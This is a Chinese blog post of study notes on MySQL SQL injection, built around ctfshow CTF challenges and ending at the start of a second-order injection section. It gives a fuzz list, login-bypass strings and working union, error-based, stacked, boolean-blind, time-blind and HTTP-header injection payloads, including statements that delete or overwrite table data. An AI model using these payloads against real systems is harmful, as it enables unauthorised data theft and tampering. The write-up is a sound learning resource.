---
title: sql注入
abbrlink: 530fceb2
date: 2026-03-02 22:17:11
tags:
  - sql注入
  - web
  - owatop10
categories:
  - 网安技术
---

## 前言

  之前的sql注入笔记写得太垃圾了，自己都看不懂，现在正好放假，重新再整理一篇，随便回顾一下，至于为什么不用sqlmap一把梭，既然是笔记了，全部都粘sqlmap一把梭的截图也不好吧，当然最后我会写一下sqlmap的用法的

## 什么是sql注入

  SQL注入（SQL Injection）是一种常见的网络安全攻击技术，攻击者通过在Web应用程序的输入字段中插入恶意的SQL代码，欺骗数据库服务器执行非授权的SQL查询命令。

  由于数据库系统的架构和SQL语法存在差异，SQL注入手法也因数据库类型而不同：例如MySQL中常用`--`或`#`注释，Oracle则使用`--`并依赖双竖杠`||`拼接字符串；Access数据库需要借助`IIF()`函数进行盲注判断；而在Redis这类键值数据库的注入则截然不同——攻击者主要利用未授权访问或通过`EVAL`命令执行Lua脚本，或通过`CONFIG SET`修改持久化路径来写入Webshell，其本质是利用了NoSQL的指令注入而非传统的SQL语法注入。

  当然由于mysql数据库的开源，以及便捷性，我们还是主要讨论mysql数据库的sql注入方法

## sql注入的成因

  这里我们用pikachu靶场为例，如果后端用一下代码进行sql语句查询，则会具有sql注入漏洞

![image-20260122151828226](posts/530fceb2/images/image-20260122151828226.webp)![image-20260122152752378](posts/530fceb2/images/image-20260122152752378.webp)

  这里我们分析后端代码，该代码接收两个参数，一个是确认提交`submit`，一个就是查询参数`id`，然后直接执行sql语句查询，如果我们传参`id=1 union select version(),database()`

![image-20260122153338128](posts/530fceb2/images/image-20260122153338128.webp)

  就拿到了数据库的信息，(当然，你也可以进行删除，增加等等一系列操作)。

## 测试是否存在sql注入

  使用下面的fuzz字典进行fuzz

```text
select
selselectect
where
whwhereere
union
uniunionon
union all
uniunionon alalll
union select
uniunionon selselectect
and
aandnd
or
oorr
--
#
/*
*/
;
'
"
`
-- -
--+
limit
limlimitit
offset
offoffsetset
order by
ordorderer by
group by
grogroupup by
having
hahavingving
sleep
sleesepep
benchmark
benbenchchmarkmark
substring
subsubstringstring
mid
mimidid
ascii
ascasciiii
char
charcharar
hex
hhexex
ord
oordrd
if
iiff
case
cacasese
extractvalue
exextracttractvaluevalue
updatexml
upupdatedatedatexmlxml
name_const
namename__conconstrt
exp
eexpxp
~(select*
~(--(select*
waitfor delay
wawaitwaitforfor deladelayay
xp_cmdshell
xpxp__cmdcmdshellshell
sp_executesql
spsp__execexecutesqlutesql
cast
cacasstst
convert
conconvertvert
declare
decdeclareclare
exec
eexecxec
execute
execexecutecute
master..sysdatabases
masmasterter....syssysdatabasesdatabases
information_schema
ininfoformationformation____schemascherma
schema_name
schemaschema__namename
table_name
tabletable__namename
column_name
colcolumnumn__namename
@@version
@@version@@version
version()
versionversion()()
database()
databasedatabase()()
user()
useruser()()
current_user
currentcurrent__useruser
system_user
systemsystem__useruser
session_user
sessionsession__useruser
load_file
loloafiled_file
outfile
outoutfilefile
dumpfile
dumpdumpfilefile
into outfile
ininto to outoutfilefile
into dumpfile
ininto to dumpdumpfilefile
```

## sql注入的各种手段

### 引号拼接

  这是SQL注入探测的第一步，旨在判断后端代码如何“包裹”用户输入，以确定最终的SQL语句结构。核心方法是提交一个单引号 `'` 或双引号 `"`。

#### 测试场景

  任何在登录框、搜索框、URL参数等任何可输入的地方，尝试提交一个单引号。

这里我们使用ctfshow-web171为例，题目如下：

![image-20260122164746367](posts/530fceb2/images/image-20260122164746367.webp)

`limit`：限制查询返回结果为x行（limit 5,10就是查询结果为第4行在往后取10行）

  可以看到给了查询语句，以及根据用户ID进行sql查询，第一个select查询结果不允许有username，参数使用`'`包裹

这里payload为`1' OR '1'='1`,查询语句即为

```mysql
select username,password from user where username !='flag' and id = '1' OR '1'='1' limit 1;
```

因为1=1恒等，而OR条件只需二者满足其一即可，所以查询条件恒成立，则会查询当前所有列的所有数据

![image-20260122171146812](posts/530fceb2/images/image-20260122171146812.webp)

拿到flag

> ctfshow{c5c82b69-b245-4a80-b7ed-df359bc6c21c}

#### 万能密钥

```text
admin' --
admin' #
admin' /*
admin' -- -
admin' # 
admin' --+ 
admin') --
admin') #
admin') /*
admin" --
admin" #
admin" /*
admin") --
admin") #
admin") /*
admin) --
admin) #
admin) /*
' or 1=1 --
' or 1=1 #
' or 1=1 /*
' or '1'='1' --
' or "1"="1" --
' or 1=1-- -
' or 1=1--+
') or ('1'='1' --
') or ('1'='1') --
') or '1'='1'-- 
') or 1=1 --
" or 1=1 --
" or "1"="1" --
admin' or '1'='1
admin' or 1=1
admin' or 'x'='x
admin" or "x"="x
admin' or ''='
admin') or 1=1-- -
admin') or ('1'='1')-- -
admin' or 1=1 limit 1--
admin' union select 1,2,3 --
ffifdyop                
'or 1=1 limit 1 #
123456' or 1=1 #
') or sleep(5) --      
```

#### mysql中的运算符优先级

| 优先级 | 运算符 / 关键字                                              |
| :----- | :----------------------------------------------------------- |
| 1      | `:=`                                                         |
| 2      | `||`, `OR`, `XOR`                                            |
| 3      | `&&`, `AND`                                                  |
| 4      | `NOT`                                                        |
| 5      | `BETWEEN`, `CASE`, `WHEN`, `THEN`, `ELSE`                    |
| 6      | `=`, `<=>`, `>=`, `>`, `<=`, `<`, `<>`, `!=`, `IS`, `LIKE`, `REGEXP`, `IN` |
| 7      | `|`                                                          |
| 8      | `&`                                                          |
| 9      | `<<`, `>>`                                                   |
| 10     | `-`, `+`                                                     |
| 11     | `*`, `/`, `DIV`, `%`, `MOD`                                  |
| 12     | `^`                                                          |
| 13     | `-` (一元减号), `~` (一元比特反转)                           |
| 14     | `!`                                                          |
| 15     | `BINARY`, `COLLAT`                                           |

下面题目以ctfshow-web181为例

![image-20260202174405042](posts/530fceb2/images/image-20260202174405042.webp)

  分析题目waf，过滤了可以绕过空格的之类tab，还过滤了用于sql写马的file和into，过滤了union查询的select

查询的sql语句where条件为一个`and`连接，因为OR的优先级仅次于`:=`,所以直接使用or拼接即可得到flag

使用括号代替空格进行绕过

```mysql
1'or('1'='1')--%01
```



### union注入

#### 注入条件

  首先要达到union联合注入，要满足以下条件：

1. union查询所有的结果都满足相同列数(一般使用order by来判断查询结果列数)

	`order by`:代表查询结果按照第几列来进行排序，通常`order by`第x列回显报错则代表查询结果有x-1列

例如：

![image-20260122154658340](posts/530fceb2/images/image-20260122154658340.webp)

  这里`order by 3`报错了，则查询结果有两列

#### 注入过程

  当我们判断可以进行union注入时，首先我们要拿到数据库名

下面题目以ctfshow-web172为例

1. 判断查询结果

	![image-20260122174659147](posts/530fceb2/images/image-20260122174659147.webp)

	通用：order by判断查询结果为几列

	```mysql
	1' order by 3-- a
	```

2. union注入拿到数据库名

	```mysql
	1' union select 1,2,database()-- a
	```

	![image-20260122190937593](posts/530fceb2/images/image-20260122190937593.webp)

	  这里拿到数据库名`ctfshow_web`

	通用：

	拿当前数据库：

	```mysql
	1' union select 1,2,database()-- a
	```

	拿所有数据库：

	```mysql
	1' union select group_concat(schema_name),2,3 from information_schema.schemata-- a
	```

	`--`后面要空一格才能表示注释

3. union注入拿到表名

	```mysql
	1' union select 1,2,table_name from information_schema.tables where table_schema=database()-- a
	```

	![image-20260122192621088](posts/530fceb2/images/image-20260122192621088.webp)

	  这里拿到两个表名`ctfshow_user、ctfshow_user2`

	通用：

	```mysql
	1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- a
	```

	`group_concat`：将当前分组统一输出，我个人习惯用这个，能避免输出多行的问题(有些题目无法注释，且限制多行输出时即可使用)

4. union注入拿到列名

	```mysql
	1' union select column_name,2,3 from information_schema.columns where table_name='ctfshow_user2' and table_schema=database()-- a
	```

	![image-20260122194014810](posts/530fceb2/images/image-20260122194014810.webp)

	  拿到三个列名`id、username、password`

	通用：

	```mysql
	1' union select group_concat(column_name),2,3 from information_schema.columns where table_name='ctfshow_user2' and table_schema=database()-- a
	```

5. union查询字段名

	```mysql
	1' union select username,password,3 from ctfshow_user2-- a
	```

	![image-20260122194225608](posts/530fceb2/images/image-20260122194225608.webp)

	  拿到flag

	> ctfshow{7f1a6a08-f299-477b-be11-6f55207637dc}

	通用：

	```mysql
	1' union select group_concat(username),group_concat(password),3 from ctfshow_user2-- a
	```

### 报错注入

  这里以ctfshow-web244为例，题目如下：

![image-20260228224243026](posts/530fceb2/images/image-20260228224243026.webp)

#### 判断报错注入

1. 输入特殊字符，有语法错误回显即存在报错注入，如下：

	```mysql
	'
	```

	![image-20260228223755456](posts/530fceb2/images/image-20260228223755456.webp)

#### 获取数据库名

2. 使用updatexml执行sql语句并将其当作报错语句报错出来(0x7e='~')

	```mysql
	' or updatexml(1,concat(0x7e,(select database())),3)-- a
	```

	`UPDATEXML(xml_target, xpath_expr, new_xml)`：

	- **xml_target**: 要修改的 XML 字符串或列
	- **xpath_expr**: XPath 表达式，定位要更新的节点（重点就在于XPath表达式可以执行sql语句）
	- **new_xml**: 替换节点的新 XML 内容

	```text
	-- 执行过程：
	-- 1. 执行子查询：select group_concat(table_name) from information_schema.tables where table_schema=database() → 所有的表名
	-- 2. CONCAT生成XPath：`~所有表名~`
	-- 3. MySQL验证XPath：发现 `~` 不是有效的XPath语法
	-- 4. 报错并显示：`XPATH syntax error: '~所有表名~'`
	```

	![image-20260228225809330](posts/530fceb2/images/image-20260228225809330.webp)

#### 获取数据表名

```mysql
' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3)-- a
```

![image-20260228225538421](posts/530fceb2/images/image-20260228225538421.webp)

#### 获取列名

```mysql
' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flag' and table_schema=database())),3)-- a
```

![image-20260228230035371](posts/530fceb2/images/image-20260228230035371.webp)

#### 获取数据项

MySQL 错误信息最多显示 64 个字符，XPath 表达式长度不能超过 65535 个字符，所以flag需要截断获取，这里使用substr及其等价函数即可

substr获取前30字符:

```mysql
' or updatexml(1,concat(0x7e,substr((select flag from ctfshow_flag),1,30)),3)-- a
```

substr获取后30字符：

```mysql
' or updatexml(1,concat(0x7e,substr((select flag from ctfshow_flag),31,30)),3)-- a
```

### 堆叠注入

#### 定义

  Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。

对于mysql简单来说就是加上`;`从而保证我们分号后面的语句达到sql注入的效果。

  在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：`1; DELETE FROM products`服务器端生成的sql语句为：` Select * from products where productid=1;DELETE FROM products`当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。

所以在正常的渗透测试中，我们会尽量避免增删改数据，以此造成垃圾数据，因此这项注入多用于ctf比赛当中.

#### 注入过程

  这里以ctfshow-web195为例，题目如下：

![image-20260207113052482](posts/530fceb2/images/image-20260207113052482.webp)

查询语句是根据where的筛选条件，进行pass查询
返回逻辑检测，密码输入只能为数字，密码判断即为登录成功，waf拦截，用户名不能sql注入写马，不能用union注入，过滤空格

这里flag返回逻辑是只要登录成功就会返回flag，所以用堆叠注入把查询的密码进行修改，空格被过滤用反引号包裹表名、列名即可

根据前面的关卡，已知条件：数据库`ctfshow_web`数据表`ctfshow_user`密码列`pass`

如果是有查询结果返回的题目，可以试一下下面的堆叠注入（这里只会返回登录成功之类，没有查询结果返回）

1. 查询当前数据库

	```mysql
	admin;show databases;
	```

2. 查询当前数据表

	```mysql
	admin;show tables;
	```

3. 查询列数据

	```mysql
	admin;show columns from ctfshow_user;
	```

这里账户不是admin了，经过测试0返回密码错误，即存在0这个账户

修改ctfshow_user的pass这一列所有数据项为0

```mysql
0;update`ctfshow_user`set`pass`=0
```

修改成功之后直接使用密码为0登录即成功拿到flag

### 盲注

#### 布尔盲注

  这里以ctfshow-web174为例，题目如下：

![image-20260122221413974](posts/530fceb2/images/image-20260122221413974.webp)

这里对输出进行了过滤，只有在没有flag以及没有数字的情况下，才会进行回显正确

##### 判断布尔盲注

1. 首先利用引号拼接测试是否有true和false两种情况回显

  true情况回显：

  ```mysql
1' and '1'='1'-- a
  ```

  ![image-20260122225235670](posts/530fceb2/images/image-20260122225235670.webp)

  false情况回显：

  ```mysql
1' and '1'='2'-- a
  ```

  ![image-20260122225326996](posts/530fceb2/images/image-20260122225326996.webp)

##### 数据库长度

2. 获取数据库长度

  ```mysql
1' and length(database())=1-- a
  ```

  `length()`：获取字符串的长度

  将这个请求直接发送到bp的intruder模块中，从1爆破到20，一般数据库长度不会超过20位

  ![image-20260122230233464](posts/530fceb2/images/image-20260122230233464.webp)

  按回显长度排序，很明显第11位爆破时有结果，回显内容也不同，说明数据库的长度为11位

  ![image-20260122230345721](posts/530fceb2/images/image-20260122230345721.webp)

##### 数据库名

3. 获取数据库名

  ```mysql
1' and ascii(substr(database(),1,1))=1-- a
  ```

  `substr(x,y)`：代表从第x位取y个字符，（sql注入中y始终为1，表示取第x位字符）

  `ascii`：代表ascii码十进制代表的字符，例如41代表A

  依然是将payload放入bp的intruder模块中，取substr的x和ascii的值为攻击变量，x为从1到11(我们刚才获取的数据库长度)，ascii码值为ascii的十进制范围即1到127，攻击模式为最后一个集束炸弹

  ![image-20260122231609022](posts/530fceb2/images/image-20260122231609022.webp)

  先按回显长度排序，再按攻击顺序（id）排序，payload2即是数据库每一位字符的ascii码十进制

  ![image-20260122231719286](posts/530fceb2/images/image-20260122231719286.webp)

  拿一个提取文字截图工具，提取之后，放到十进制转ascii工具中

  ![image-20260122232156105](posts/530fceb2/images/image-20260122232156105.webp)

  成功拿到数据库名：`ctfshow_web`

##### 数据表长度

4. 获取需要注入数据库的所有数据库表的长度

  接下来的步骤都大差不差就payload有些改变，但是爆破流程和转换流程是一样的

  ```mysql
1' and length((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'))=1-- a
  ```

  select语句查询理解：从`information_schema.tables`这个表查询，筛选条件为数据库名为当前数据库，最后用`group_concat`将查询结果统一分组输出

  这里末尾有两个括号，一个是length函数的括号，一个是将执行select语句的括号

  将这个请求直接发送到bp的intruder模块中，从1爆破到100，题目当前数据库的所有表名合起来长度不会超过100（真实环境的话，表名长度估计上千左右，真实开发数据库会有很多表）**如果没有结果，就继续加长度**

  ![image-20260128223803930](posts/530fceb2/images/image-20260128223803930.webp)

  按回显长度排序，很明显第13位爆破时有结果，回显内容也不同，说明当前数据库的所有表名合起来长度为13

  ![image-20260128224154633](posts/530fceb2/images/image-20260128224154633.webp)

##### 数据表名

5. 获取数据库表名

  ```mysql
1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),1,1))=1-- a
  ```

  这里和获取数据库名差不多，也是使用`ascii`和`substr`，注意：**database后面还有一个select的括号，以及语句最后有两个括号即可**

  依然是将payload放入bp的intruder模块中，取substr的x和ascii的值为攻击变量，x为从1到13(我们刚才获取的当前数据库的所有表名长度)，ascii码值为ascii的十进制范围即1到127，攻击模式为最后一个集束炸弹

  ![image-20260128225022226](posts/530fceb2/images/image-20260128225022226.webp)

  先按回显长度排序，再按攻击顺序（id）排序，payload2即是当前数据库的所有表名每一位字符的ascii码十进制，后面转换我就不详细描述了，和前面获取数据库一样

  ![image-20260128225324890](posts/530fceb2/images/image-20260128225324890.webp)

  成功拿到当前数据库所有表名：`ctfshow_user4`

##### 列长度

6. 获取查询表的所有列长度

  ```mysql
1' and length((select group_concat(column_name) from information_schema.columns where table_name='flagbab' and table_schema='ctfshow'))=1-- a
  ```

  select语句查询理解：从`information_schema.columns`这个表查询，筛选条件为数据库名为当前数据库表名为想要查询表，最后用`group_concat`将查询结果统一分组输出

  将这个请求直接发送到bp的intruder模块中，从1爆破到100，题目当前数据库的查询表的所有列名合起来长度不会超过100（真实环境的话，列长度看数据库体量（大的话几百上千万都是有可能的），真实开发列数据量庞大）**如果没有结果，就继续加长度**

  ![image-20260128225831782](posts/530fceb2/images/image-20260128225831782.webp)

  按回显长度排序，很明显第20位爆破时有结果，回显内容也不同，说明当前数据库的查询表的所有列名合起来长度为20

  ![image-20260128230407254](posts/530fceb2/images/image-20260128230407254.webp)

##### 具体列

7. 获取查询表的所有列

  ```mysql
1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flagbab' and table_schema='ctfshow'),1,1))=1-- a
  ```

  依然是将payload放入bp的intruder模块中，取substr的x和ascii的值为攻击变量，x为从1到20(我们刚才获取的当前数据库查询表的列名长度)，ascii码值为ascii的十进制范围即1到127，攻击模式为最后一个集束炸弹

  ![image-20260128230935086](posts/530fceb2/images/image-20260128230935086.webp)

  先按回显长度排序，再按攻击顺序（id）排序，payload2即是当前数据库的所有表名每一位字符的ascii码十进制，后面转换我就不详细描述了，和前面获取数据库一样

  ![image-20260128231138234](posts/530fceb2/images/image-20260128231138234.webp)

  成功拿到查询表的所有列名：`id、username、password`

##### 数据项长度

8. 获取具体列的值长度/数据项的长度

  首先我们获取username的这个列的吧

  获取所有数据项长度：

  ```mysql
1' and length((select group_concat(username) from ctfshow_user4))=1-- a
  ```

  只获取一条数据项长度：

  ```mysql
1' and length((select username from ctfshow_user4 limit 0,1))=1-- a
  ```

  将这个请求直接发送到bp的intruder模块中，从1爆破到2000,这个长度涉及到了具体的数据了，这个也是看数据库体量的(真实环境中，如果是人员信息数据库，那么这个可以说大到无法想象)

  ![image-20260128232946575](posts/530fceb2/images/image-20260128232946575.webp)

  依然按照回显长度排序，可以拿到username这一列的所有值的长度为211

  ![image-20260128233002587](posts/530fceb2/images/image-20260128233002587.webp)

##### 数据项值

9. 获取具体列的值

获取具体列的所有数据项

  ```mysql
1' and ascii(substr((select group_concat(flag4sa) from ctfshow.flagbab),1,1))=1-- a
  ```

 获取具体列的一条数据项

  ```mysql
1' and ascii(substr((select username from ctfshow_user4 limit 0,1),1,1))=1-- a
  ```

  ![image-20260128234124838](posts/530fceb2/images/image-20260128234124838.webp)

  先按回显长度排序，再按攻击顺序（id）排序，payload2即是具体列的所有数据项每一位字符的ascii码十进制

  ![image-20260128234845489](posts/530fceb2/images/image-20260128234845489.webp)

  ![image-20260128235536918](posts/530fceb2/images/image-20260128235536918.webp)

  成功拿到具体列的所有数据项：`admin,user1,user4,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,flag`

##### 获取行

10. 获取一行数据

  这里我们已知一列的数据项，获取该列该数据项的一行数据即简单许多，还是回到这道题，我们已知数据表为三列：`id、username、password`，已知username所有数据项，获取数据项为`flag`的一行数据

1. 首先还是获取flag这一行，passowrd这一列的数据项的长度

	```mysql
	1' and length((select password from ctfshow_user4 where username='flag'))=1-- a
	```

	这里就属于password具体值长度，现在数据库都用加盐慢哈希存储，一般存储也是给一个可变数据类型varchar，所以一般从1爆破到256即可（这里是ctfshow题目，给的固定flag长度为45）

	![image-20260129000903923](posts/530fceb2/images/image-20260129000903923.webp)

	还是按回显长度排序，拿到flag的password数据项长度为45

	![image-20260129001008045](posts/530fceb2/images/image-20260129001008045.webp)

2. 获取flag的password的数据项

	```mysql
	1' and ascii(substr((select password from ctfshow_user4 where username='flag'),1,1))=1-- a
	```

	![image-20260129001244268](posts/530fceb2/images/image-20260129001244268.webp)

	先按回显长度排序，再按攻击顺序（id）排序，payload2即是具体列的具体数据项每一位字符的ascii码十进制

	![image-20260129001545889](posts/530fceb2/images/image-20260129001545889.webp)

	![image-20260129001914393](posts/530fceb2/images/image-20260129001914393.webp)

	成功拿到flag也是flag这一行

	> ctfshow{fd6fbf5b-2d79-43c1-a7e7-c869a146ae92}

#### 时间盲注

  这里以ctfshow-web175为例，题目如下：

![image-20260129164520412](posts/530fceb2/images/image-20260129164520412.webp)

题目限制：如果匹配到了`\x00-\x7f`范围，即为失败，这个是所有可见字符的ascii十六进制，即所有字符都被禁止，你正常查询也是无数据回显，这个就是典型的时间盲注

**delete的时间盲注只能线程不能并发**

##### 判断时间盲注

1. 首先判断是否可以进行时间盲注，判断的话就把sleep时间调长一些，以免网速的影响

	```mysql
	1' and if(1=1,sleep(10),null)-- a
	```

	`IF(condition, value_if_true, value_if_false)`:`condition`值为需要判断的条件表达式，`value_if_true`是`condition`为真时返回的值，`value_if_false`相反

	`sleep`：顾名思义睡眠时间，单位是秒

	![image-20260129172110449](posts/530fceb2/images/image-20260129172110449.webp)

	  可以看到进入了加载时间，也可以用bp抓包看响应时间，都是可以进行判断sleep是否执行成功

##### 数据库长度

2. 获取数据库长度

时间盲注和布尔盲注其实大致流程都差不多，只是多了一个if函数进行判断,但是时间要比布尔盲注长很多，因为sleep判断需要时间

```mysql
1' and if(length(database())=1,sleep(4),null)-- a
```

获取全部数据库的长度

```mysql
1' and if(length((select group_concat(schema_name) from information_schema.schemata))=1,sleep(4),null)-- a
```

![image-20260129172834692](posts/530fceb2/images/image-20260129172834692.webp)

筛选变了，因为不管执行成功还是失败，回显都是一样，所以根据**接收到响应进行排序**

![image-20260129173012621](posts/530fceb2/images/image-20260129173012621.webp)

明显第11条符合我们sleep(4)的执行，即数据库长度为11

##### 数据库名

3. 获取当前数据库

```mysql
1' and if(ascii(substr(database(),1,1))=1,sleep(4),null)-- a
```

获取所有数据库

```mysql
1' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=1,sleep(4),null)-- a
```

![image-20260129173616064](posts/530fceb2/images/image-20260129173616064.webp)

为响应时间不同添加高亮，然后筛选为仅显示高亮，依然是payload2的ascii码转字符串

![image-20260129173704089](posts/530fceb2/images/image-20260129173704089.webp)

![image-20260129173829958](posts/530fceb2/images/image-20260129173829958.webp)

成功拿到数据库名：`ctfshow_web`

##### 数据表长度

4. 获取需要注入数据库的所有数据库表的长度

	```mysql
	1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1,sleep(4),null)-- a
	```

	![image-20260129175126430](posts/530fceb2/images/image-20260129175126430.webp)

	响应时间排序，拿到所有表长度为13

	![image-20260129175204423](posts/530fceb2/images/image-20260129175204423.webp)

##### 数据表名

5. 获取数据库表名

	```mysql
	1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=1,sleep(4),null)-- a
	```

	![image-20260129175501585](posts/530fceb2/images/image-20260129175501585.webp)

	响应时间排序，ascii码十进制转字符串

	![image-20260129175638077](posts/530fceb2/images/image-20260129175638077.webp)

	![image-20260129175658703](posts/530fceb2/images/image-20260129175658703.webp)

	拿到所有表名：`ctfshow_user5`

##### 列长度

6. 获取查询表的所有列长度

	```mysql
	1' and if(length((select group_concat(column_name) from information_schema.columns where table_name='flagugs' and table_schema='ctfshow'))=1,sleep(4),null)-- a
	```

	![image-20260129175910775](posts/530fceb2/images/image-20260129175910775.webp)

	响应时间排序，拿到所有列长度为20

	![image-20260129180224389](posts/530fceb2/images/image-20260129180224389.webp)

##### 具体列

7. 获取查询表的所有列

	```mysql
	1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flagugs' and table_schema='ctfshow'),1,1))=1,sleep(4),null)-- a
	```

	![image-20260129180453431](posts/530fceb2/images/image-20260129180453431.webp)

	响应时间排序，ascii码十进制转字符串

	![image-20260129180609274](posts/530fceb2/images/image-20260129180609274.webp)

	![image-20260129180627375](posts/530fceb2/images/image-20260129180627375.webp)

	拿到具体列的值：`id、username、password`

##### 数据项长度

8. 获取具体列的值长度/数据项的长度

	首先我们获取username的这个列的吧

	​    获取所有数据项长度：

	```mysql
	1' and if(length((select group_concat(flag43s) from flagugs))=1,sleep(4),null)-- a
	```

	​    只获取一条数据项长度：

	```mysql
	1' and if(length((select username from ctfshow_user5 limit 0,1))=1,sleep(4),null)-- a
	```

	图片的示例都是按照获取所有数据项来的

	![image-20260129181159701](posts/530fceb2/images/image-20260129181159701.webp)

	响应时间排序，拿到所有数据项长度和为211

	![image-20260129181308553](posts/530fceb2/images/image-20260129181308553.webp)

##### 数据项值

9. 获取具体列的值

	获取具体列的所有数据项

  ```mysql
1' and if(ascii(substr((select group_concat(flag43s) from flagugs),1,1))=1,sleep(4),null)-- a
  ```

​      获取具体列的一条数据项

  ```mysql
1' and if(ascii(substr((select group_concat(username) from ctfshow_user5 limit 0,1),1,1))=1,sleep(4),null)-- a
  ```

  ![image-20260129181631168](posts/530fceb2/images/image-20260129181631168.webp)

响应时间排序，ascii码十进制转字符串

![image-20260129182516975](posts/530fceb2/images/image-20260129182516975.webp)

![image-20260129182723457](posts/530fceb2/images/image-20260129182723457.webp)

成功获取数据项值：`admin,userl,user5,userAUTO, userAUTO, userAUTO, userAUTO,userAUTO, userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,userAUTO,flag`

##### 获取行

10. 获取一行数据

  这里我们已知一列的数据项，获取该列该数据项的一行数据即简单许多，还是回到这道题，我们已知数据表为三列：`id、username、password`，已知username所有数据项，获取数据项为`flag`的一行数据

1. 首先还是获取flag这一行，passowrd这一列的数据项的长度

	```mysql
	1' and if(length((select password from ctfshow_user5 where username='flag'))=1,sleep(4),null)-- a
	```

	![image-20260129183022297](posts/530fceb2/images/image-20260129183022297.webp)

	还是按响应时间排序，拿到flag的password数据项长度为45

	![image-20260129183125148](posts/530fceb2/images/image-20260129183125148.webp)

2. 获取flag的password的数据项

	```mysql
	1' and if(ascii(substr((select password from ctfshow_user5 where username='flag'),1,1))=1,sleep(4),null)-- a
	```

	![image-20260129183335437](posts/530fceb2/images/image-20260129183335437.webp)

	响应时间排序，ascii码十进制转字符串

	![image-20260129183553316](posts/530fceb2/images/image-20260129183553316.webp)

	![image-20260129183613876](posts/530fceb2/images/image-20260129183613876.webp)

	成功拿到flag也是flag这一行

	> ctfshow{4f7c17af-77c7-47bb-8218-20e9f71785e6}

### http头注入

#### UA头注入

  这里以ctfshow-web534为例，题目如下：

![image-20260301210025538](posts/530fceb2/images/image-20260301210025538.webp)

登录用户dumb:dumb之后，回显了登录的ip以及ua，可知后端接收了ua，（漏洞点在于后端用sql语句将ua记录在日志中）尝试ua注入

1. 判断是否有注入点，ua加入’”)

	```payload
	’”)
	```

	![image-20260301210412542](posts/530fceb2/images/image-20260301210412542.webp)

	可以看到题目回显了mysql报错，首先就确定了有报错注入

2. 获取数据库名

	后端语句为：

	```mysql
	INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)
	```

	将值括号闭合payload如下：

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),3) or'
	```

	或者将ip和username的补上

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),3),1,1)-- a
	```

3. 获取表名

	将值括号闭合payload如下：

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow')),3) or'
	```

4. 获取列名

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag' and table_schema='ctfshow')),3) or'
	```

5. 获取数据项

	substr获取前30字符：

	```mysql
	' or updatexml(1,concat(0x7e,substr((select flag4 from ctfshow.flag),1,30)),3) or'
	```

	substr获取后30字符：

	```mysql
	' or updatexml(1,concat(0x7e,substr((select flag4 from ctfshow.flag),31,30)),3) or'
	```

#### referer注入

  这里以ctfshow-web535为例，题目如下：

![image-20260301213618722](posts/530fceb2/images/image-20260301213618722.webp)

和上一关不同的就是换成了referer回显，其他都是一样的

1. 获取数据库名

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),3) or'
	```

2. 获取表名

	将值括号闭合payload如下：

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow')),3) or'
	```

3. 获取列名

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag' and table_schema='ctfshow')),3) or'
	```

4. 获取数据项

	substr获取前30字符：

	```mysql
	' or updatexml(1,concat(0x7e,substr((select flag4 from ctfshow.flag),1,30)),3) or'
	```

	substr获取后30字符：

	```mysql
	' or updatexml(1,concat(0x7e,substr((select flag4 from ctfshow.flag),31,30)),3) or'
	```

#### cookie注入

  这里以ctfshow-web536为例，题目如下：

![image-20260301214219392](posts/530fceb2/images/image-20260301214219392.webp)

登录成功之后，返回了cookie，尝试对cookie进行判断是否有注入点

![image-20260301214336052](posts/530fceb2/images/image-20260301214336052.webp)

有limit回显，尝试union注入

1. 判断列数

	```mysql
	' order by 3-- a
	```

2. 获取数据库名

	```mysql
	' union select group_concat(schema_name),2,3 from information_schema.schemata-- a
	```

3. 获取数据表名

	```mysql
	' union select 1,2,table_name from information_schema.tables where table_schema='ctfshow'-- a
	```

4. 获取数据列名

	```mysql
	' union select group_concat(column_name),2,3 from information_schema.columns where table_name='flag' and table_schema='ctfshow'-- a
	```

5. 获取数据项

	```mysql
	' union select 1,flag4,3 from ctfshow.flag-- a
	```

### 二次注入

  二次注入就是后端没有预处理前端传来的数据，就将其保留在数据库中，再次查询的时候由于脏数据的影响，从而达到了二次注入

  这里以ctfshow-web540为例，题目如下：

![image-20260302144925524](posts/530fceb2/images/image-20260302144925524.webp)

